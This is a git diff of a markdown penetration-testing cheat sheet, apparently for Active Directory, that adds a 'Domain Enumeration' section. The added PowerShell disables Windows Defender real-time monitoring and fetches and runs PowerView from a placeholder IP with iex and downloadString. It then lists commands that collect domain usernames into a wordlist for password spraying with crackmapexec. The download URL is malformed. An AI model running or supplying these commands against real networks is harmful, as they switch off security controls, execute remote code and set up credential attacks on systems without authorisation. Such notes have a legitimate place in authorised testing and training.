@@ -140,10 +140,31 @@ Start with automated tools to search for low hanging fruits
   <details><summary>INITIAL ACCESS</summary><blockquote>
     :smile:
   </blockquote></details>
-  <details><summary>LOCAL PRIVILEDGE ESCALATION</summary><blockquote>
-    :smile:
+    
+  <details><summary>DOMAIN ENUMERATION</summary><blockquote>
+    # Patch AMSI or disable AV
+    <br>
+    ```powershell
+      Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
+      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_Dev.ps1')
+    ```
+    <br>
+    # Get all the users in the domain
+
+
+    # Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying 
+    ```powershell
+      Get-NetUsers | select samaccountname > username.txt
+      
+      # Get all the computers in the domain
+      Get-NetComputer
+
+      # Get information about specific computer
+      Get-NetComputer -Identity <computer_name>
+
+    ```
   </blockquote></details>
-    <details><summary>LATERAL MOVEMENT ENUMERATION</summary><blockquote>
+    <details><summary>LATERAL MOVEMENT </summary><blockquote>
     :smile:
   </blockquote></details>
    <details><summary>PERSISTENCE AND CLEARING TRACKS</summary><blockquote>
